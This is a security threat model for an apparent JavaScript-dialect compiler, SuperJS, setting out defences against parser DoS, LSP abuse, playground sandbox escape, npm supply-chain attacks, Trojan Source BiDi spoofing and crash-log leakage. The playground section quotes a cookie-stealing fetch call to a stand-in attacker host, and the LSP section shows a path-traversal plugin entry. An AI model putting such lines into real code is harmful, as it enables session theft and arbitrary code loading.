# SuperJS Threat Model

> **Stage 0 exit criterion S7.** This document is maintained as a living record;
> every new threat surface discovered during development MUST be added here before
> the relevant feature ships. The `Owner Stage` column indicates the earliest stage
> at which the mitigation is expected to be in force.

---

## Scope

### What we are protecting

| Asset | Why it matters |
|-------|----------------|
| **Compiler process integrity** | The `superjs` CLI runs in developer environments and CI pipelines. A compiler that crashes, hangs, or produces wrong output silently is a supply-chain risk. |
| **Source-file confidentiality** | Source files fed to the compiler may contain business secrets, credentials embedded in comments, or PII. Compiler-generated artifacts (crash logs, diagnostics) must not inadvertently leak this material. |
| **Published packages** | `@superjs/compiler-types` and future `@superjs/*` packages are installed by downstream projects. Tampering with the published artifact is a classic supply-chain attack. |
| **Playground users** | The browser-based REPL (Stage 3+) runs untrusted SJS snippets. A sandbox escape could execute code in the user's browser context. |
| **LSP client (editor) integrity** | The LSP server runs as a long-lived background process with file-system access. Malformed editor messages or malicious workspace files must not escalate into arbitrary code execution or memory exhaustion. |
| **Developer identity** | Publish credentials (npm token, GitHub Actions secrets) grant the ability to push malicious package versions. These must be protected by 2FA and scope-limited tokens. |

### Out of scope

- Runtime security of programs **compiled by** SuperJS. SuperJS compiles to ES2022 JavaScript; the runtime security of that output is the responsibility of the JS engine and the application author.
- Network-layer security of the npm registry itself.
- Security of the developer's operating system or hardware.
- Formal verification of type-checker soundness (this is a correctness goal, not a security goal, though the two overlap).

---

## Threat Surface Table

| # | Surface | Threat | STRIDE category | Mitigation | Owner Stage | Status |
|---|---------|--------|-----------------|------------|-------------|--------|
| T1 | Parser — pathological nesting | DoS via deeply nested expressions (`((((x))))` 10 000 deep), huge identifiers, or quadratic lookahead | **Denial of Service** | Nesting depth limit ≤ 1 000; identifier length cap 16 384 chars; O(n) lexer guarantee; `SJS-P099` after 3 failed recoveries | Stage 1 | Planned |
| T2 | Lexer — massive token streams | DoS via 100 MB string literals, Unicode escape loops, or token-count explosion | **Denial of Service** | Per-file token limit 10 M; per-token 1 MiB cap; Unicode escape flood guard (>256 consecutive); early `SJS-P002` abort | Stage 1 | Planned |
| T3 | LSP message handling | Malformed/oversized JSON-RPC crashes or hangs the LSP server; malicious workspace config injects options | **Tampering / Denial of Service** | Message size cap 8 MiB; JSON schema validation before dispatch; no `eval`/`exec` in LSP server; config validated against `spec/config-schema.json` | Stage 1 | Planned |
| T4 | Playground sandbox isolation | Browser REPL evaluates untrusted SJS; sandbox escape reads cookies or makes cross-origin requests | **Elevation of Privilege / Information Disclosure** | Web Worker with no DOM access; `<iframe sandbox>` + strict CSP (`no unsafe-eval`, `connect-src 'none'`); no Node.js APIs in worker | Stage 3 | Planned |
| T5 | Supply-chain: `--provenance` | Compromised CI or stolen npm token pushes tampered `@superjs/*` package | **Tampering** | SLSA Level 2; publishes via GitHub Actions only; `npm publish --provenance`; 2FA required on all publish accounts; Dependabot on all dep files | Stage 0 | Partially mitigated (policy in place; attestation active from first publish) |
| T6 | BiDi-spoofing in source | U+202A–U+202E, U+2066–U+2069 make code appear different from what compiles (Trojan Source, CVE-2021-42574) | **Tampering / Spoofing** | Default: `SJS-W012` warning; strict (`--strict-bidi`): `SJS-L011` error; inside identifiers: always rejected | Stage 1 | Partially mitigated (SJS-W012 registered; lexer enforcement in Stage 1) |
| T7 | Crash-log data leakage | `.superjs/crash-*.log` contains full paths and symbol names; leaks codebase layout when shared in bug reports | **Information Disclosure** | Basenames only by default (R4 policy); full paths opt-in via `--crash-full`; logs excluded from git via `superjs init` | Stage 0/1 | Implemented (SECURITY.md policy; Stage 1 enforces in crash handler) |
| T8 | Dependency confusion: `@superjs/*` | Attacker registers `@superjs/types-core` on npm before SuperJS does; confused installs pull malicious package | **Tampering / Elevation of Privilege** | `@superjs` npm org scope claimed; 2FA on all publish accounts; Dependabot on all `package.json` files; CodeQL enabled | Stage 0 | Partially mitigated (org scope and 2FA policy defined) |

---

## Surfaces in Detail

### T1 — Parser DoS via Pathological Nesting

**Description.** A malicious or auto-generated `.sjs` file can contain arbitrarily deep expression nesting (`((((((x))))))`, deeply nested object literals, long method-call chains). The prototype's Babel-backed parser recurses proportionally to nesting depth and can stack-overflow or exhibit O(n²) lookahead with certain grammar productions.

**Attack scenario.** An attacker adds a deeply-nested fixture to a project's `src/` directory (e.g. via a compromised dependency that generates `.sjs` type stubs). CI runs `superjs build`, the process crashes or hangs, blocking all merges.

**Mitigations:**

- The Stage 1 recursive-descent parser maintains a nesting-depth counter. Any production that opens a new level (parenthesised expression, block, array/object literal, type parameter list) increments the counter. When the counter exceeds **1 000**, the parser emits `SJS-P010 nesting-depth-exceeded` and recovers at the nearest statement boundary per `spec/parser-recovery.md`.
- Identifiers are capped at **16 384 bytes** (16 KiB). Longer identifiers emit `SJS-L002 identifier-too-long` and are truncated before symbol-table insertion.
- The hand-written lexer is designed for strict O(n) throughput: no backtracking, no speculative tokenisation. The lexer will be fuzz-tested with a 100 k-iteration corpus before Sprint 1.1 done-signal.
- Per-file compile timeout of **30 seconds** (configurable; default disableable in CI). Timeout fires `SJS-P098 compile-timeout` and the pipeline continues with remaining files.

**Owner Stage:** Stage 1 Sprint 1.1 (lexer caps), Sprint 1.2 (parser depth limit).

---

### T2 — Lexer DoS via Massive Token Streams

**Description.** A file with a 500 MB string literal, or a minified file with 50 M tokens, exhausts heap memory or runs for minutes before the parser can reject it.

**Attack scenario.** A build step imports a pathologically large `.d.sjs` declaration file containing a giant string constant. `superjs check` hangs indefinitely.

**Mitigations:**

- **Per-token byte cap:** string literal body ≤ **1 048 576 bytes** (1 MiB). On crossing the cap, the lexer emits `SJS-L003 string-literal-too-large`, skips to the closing quote, and continues.
- **Per-file token count cap:** default **10 000 000** tokens. On crossing, `SJS-P002 token-limit-exceeded` is emitted and the file is aborted. Configurable via `compilerOptions.maxTokensPerFile` in `superjs.config.json`.
- **Unicode escape loop guard:** more than **256** consecutive `\uXXXX` escapes in a single string literal triggers `SJS-L004 unicode-escape-flood`; remaining escapes are treated as literal characters.
- The lexer will be fuzz-tested with libFuzzer-style random byte inputs as part of the Stage 1 CI harness.

**Owner Stage:** Stage 1 Sprint 1.1.

---

### T3 — LSP Message Handling

**Description.** The Language Server Protocol communicates over stdio (or a socket) using JSON-RPC 2.0. A malformed or oversized message, a crafted `initialize` handshake, or a malicious workspace config can crash the LSP process, exhaust memory, or — if the server calls `eval` — execute arbitrary code.

**Attack scenario 1 (malformed message).** An editor plugin bug sends `textDocument/didChange` with a 200 MB `text` field. The LSP server's JSON parser loads the entire string into memory.

**Attack scenario 2 (malicious config).** A workspace `.superjs/local.config.json` sets `compilerOptions.plugins: ["../../../evil.js"]`. The LSP server loads the plugin on workspace open.

**Mitigations:**

- **Message size cap:** the LSP transport reads the `Content-Length` header before allocating a buffer. Messages larger than **8 388 608 bytes** (8 MiB) are rejected with JSON-RPC `-32700 Parse error`; the connection is maintained.
- **JSON schema validation:** every incoming JSON-RPC message is validated against the LSP method's request schema before dispatch. Unknown fields are dropped; missing required fields return `-32602 Invalid params` without touching compiler state.
- **No `eval`/`exec` in the LSP server:** enforced by an ESLint `no-eval` rule applied to `packages/lsp/src/` in CI.
- **Config file allowlist:** `superjs.config.json` is validated against `spec/config-schema.json`. Fields not in the schema are ignored. The `compilerOptions.plugins` field (if introduced) will require an explicit user-consent trust-prompt before the LSP server loads any plugin path.
- **Memory budget:** `lsp.memoryBudgetMB` (default 512 MB) enforced via periodic heap-size checks. If exceeded, `SJS-W010 lsp-memory-pressure` is emitted and least-recently-used file caches are discarded.

**Owner Stage:** Stage 1 (LSP transport + config validation); Stage 3 (plugin trust model).

---

### T4 — Playground Sandbox Isolation

**Description.** The browser-based REPL (Stage 3 website feature) compiles and evaluates user-supplied SJS code in the browser. An unsafe evaluation context could read `document.cookie`, make cross-origin requests, or exfiltrate data.

**Attack scenario.** A user pastes SJS that compiles to `fetch('https://attacker.example/steal?data=' + document.cookie)`. If the snippet runs in the main page context, this succeeds.

**Mitigations:**

- The playground compiler and evaluator run in a **dedicated Web Worker** with no access to `document`, `window`, `localStorage`, or any DOM API.
- The website's `Content-Security-Policy` header includes: `default-src 'self'`; no `unsafe-inline`; no `unsafe-eval`; `connect-src 'none'` for the worker context; `sandbox allow-scripts` on the playground iframe.
- Compiled output is executed via a `Function` constructor **inside the worker** only, not `eval` in the main context. This use is intentional and documented; the ESLint `no-eval` rule has a scoped exception for `packages/playground/src/worker.ts`.
- No Node.js built-ins (`fs`, `child_process`, `net`, etc.) are bundled into the playground worker. The build config explicitly externalises all built-ins and fails if any sneak in.
- The SJS compiler will be compiled to **WebAssembly** (Stage 1 LLVM backend) for playground use, further isolating the compiler-code attack surface from the browser JS heap.

**Owner Stage:** Stage 3 (playground website); WebAssembly isolation follows Stage 1 LLVM backend.

---

### T5 — Supply-Chain: npm Provenance Correctness

**Description.** npm supports signed provenance attestations (SLSA) linking a published package to the GitHub Actions run that produced it. Without `--provenance`, consumers cannot verify that the installed package matches the source repository.

**Attack scenario.** A maintainer's machine is compromised. An attacker runs local `npm publish`, uploading `@superjs/compiler-types` with code that exfiltrates environment variables from every project that installs it.

**Mitigations:**

- All `@superjs/*` packages are published **exclusively via GitHub Actions** (`.github/workflows/release.yml`). Local publish is blocked by a repository rule requiring `PROVENANCE_REQUIRED=1`, set only in the Actions environment.
- Every publish step uses `npm publish --provenance`, generating a Sigstore-signed **SLSA Level 2** attestation tied to the commit SHA and workflow run ID.
- The npm `@superjs` organisation enforces **2FA for all publish operations** at org level.
- Publish tokens are **automation tokens scoped to `@superjs` only**, rotated every 90 days, stored in GitHub Actions secrets.
- **Dependabot** is configured on every `package.json` and `.github/workflows/*.yml` to surface transitive dependency CVEs within 48 hours.
- Consumers verify any installed package via `npm audit signatures`.

**Owner Stage:** Stage 0 (policy and CI scaffolding); provenance active from first `0.x` publish.

---

### T6 — BiDi-Spoofing in Source Files (Trojan Source)

**Description.** Unicode bidirectional-override characters (U+202A–U+202E LEFT-TO-RIGHT/RIGHT-TO-LEFT EMBEDDING/OVERRIDE, U+2066–U+2069 ISOLATE family) cause rendered source (in editors, GitHub, code review tools) to display differently from the bytes the compiler sees. This is the Trojan Source vulnerability (CVE-2021-42574, Boucher & Anderson 2021).

**Example.** A comment reading `/* auth check ‮ */ if (isAdmin) {` visually appears to be a full comment, but a BiDi override moves part of the token stream outside the comment. The reviewer sees dead code; the compiler sees live code.

**Attack scenario.** A malicious PR adds a `.sjs` source file where BiDi overrides make a security-critical branch appear unreachable to a reviewer while the compiler sees it as reachable.

**Mitigations:**

- The Stage 1 lexer scans every source byte for codepoints in ranges U+202A–U+202E and U+2066–U+2069.
- **Default mode:** `SJS-W012 bidi-codepoint-in-source` warning on the first occurrence per line, with a label at the exact byte offset.
- **Strict mode (`--strict-bidi`, auto-enabled by `superjs build --release`):** `SJS-L011 bidi-codepoint-rejected` error; the file fails to compile.
- **Inside identifiers:** BiDi codepoints are **always** stripped and `SJS-L011` always emitted, even without `--strict-bidi`. A BiDi override in an identifier would silently produce a different symbol name from what the developer sees.
- **Inside comments:** warning only (comments do not affect semantics), with a diagnostic note explaining the Trojan Source risk.
- `spec/error-codes/SJS-W012.md` and `spec/error-codes/SJS-L011.md` include a worked Trojan Source example and reference to CVE-2021-42574.
- 50 BiDi-spoofing negative fixtures (adapted from the WebKit/Trojan-Source corpus) are included in `tests/fixtures/lexer/bidi/` and must pass in CI.

**Owner Stage:** Stage 1 Sprint 1.1 (lexer enforcement); `SJS-W012` error-code stub in Stage 0.

---

### T7 — Crash-Log Data Leakage

**Description.** When the SuperJS compiler hits an internal assertion failure or unhandled exception, it writes `.superjs/crash-YYYYMMDD-HHMMSS.log` and prints a prefilled GitHub issue URL. If the log contains full absolute paths (e.g. `/Users/alice/work/acme-corp/secret-project/src/billing/stripe-keys.sjs`) or fully-qualified symbol names (e.g. `acme.billing.StripeSecretKey`), sharing the log in a public issue leaks sensitive information.

**Attack scenario.** A developer hits a compiler bug, pastes the crash log into a public GitHub issue without reviewing it, and inadvertently exposes their company's internal directory structure and sensitive domain symbols.

**Mitigations (R4 policy, defined in `SECURITY.md`):**

- **Default (basenames only):** the crash handler strips all parent directory components before writing file paths. `/Users/alice/.../stripe-keys.sjs` becomes `stripe-keys.sjs`. Symbol names are reduced to their final component.
- **Opt-in full paths:** `superjs build --crash-full` (or `SUPERJS_CRASH_FULL=1` env var) disables the basename-only filter, intended for local debugging sessions.
- **Log rotation:** `.superjs/crash-*.log` files older than **7 days** are deleted by the CLI on startup. Configurable via `SUPERJS_CRASH_KEEP_DAYS`.
- **GitHub issue URL:** the prefilled URL includes compiler version, OS, Node.js version, and error code — but no file names or symbol names.
- **`.gitignore` template:** `superjs init` writes `.superjs/` to `.gitignore` so crash logs are never accidentally committed.

**Owner Stage:** Stage 0 (SECURITY.md policy, `superjs init` gitignore); Stage 1 Sprint 1.x (crash handler implementation enforcing basename filter).

---

### T8 — Dependency Confusion: `@superjs/*` Namespace Squatting

**Description.** npm's dependency confusion attack (Birsan, 2021) works when an internal package name also exists on the public registry at a higher version. If an attacker registers `@superjs/types-core` on npm before the SuperJS project, projects listing that name as a dependency could install the malicious public package instead of the intended internal one.

**Attack scenario.** A company using SuperJS creates an internal monorepo listing `@superjs/internal-utils` as a dependency. An attacker registers that name on npm at version `99.0.0`. `npm install` silently pulls the malicious package.

**Mitigations:**

- The **`@superjs` npm org scope is claimed and locked** before any public announcement. All intended sub-packages are registered (even as `0.0.0` placeholders) to block squatting.
- The npm `@superjs` org enforces **2FA for all publish operations** at org level.
- A `.github/CODEOWNERS` rule routes any `package.json` change adding a new `@superjs/*` package to the maintainer for review.
- **Dependabot** is configured on all `package.json` files to detect new transitive dependencies within 48 hours.
- **CodeQL** is enabled on the repository.
- The `npm publish` CI step runs `npm pack --dry-run` and validates the packed file list against a known-good manifest before publishing.
- Internal users are advised in `SECURITY.md` to pin all `@superjs/*` deps to exact versions and commit their lockfile.

**Owner Stage:** Stage 0 (scope claim and policy); ongoing for all publish operations.

---

## Review and Update Process

This threat model is reviewed:

1. **At the start of each stage** — before the first sprint PR is merged. The stage lead checks whether new surfaces were introduced by the stage's exit criteria and adds rows to the table above.
2. **On any security advisory** — if a CVE is filed against a dependency, the relevant row is updated within 48 hours.
3. **On any public disclosure of a new attack class** — e.g. a new Unicode spoofing technique or a new npm ecosystem attack — the maintainer evaluates applicability and updates within 7 days.

Changes to this document go through the standard PR process with a required review from the CODEOWNERS for `docs/security/`.
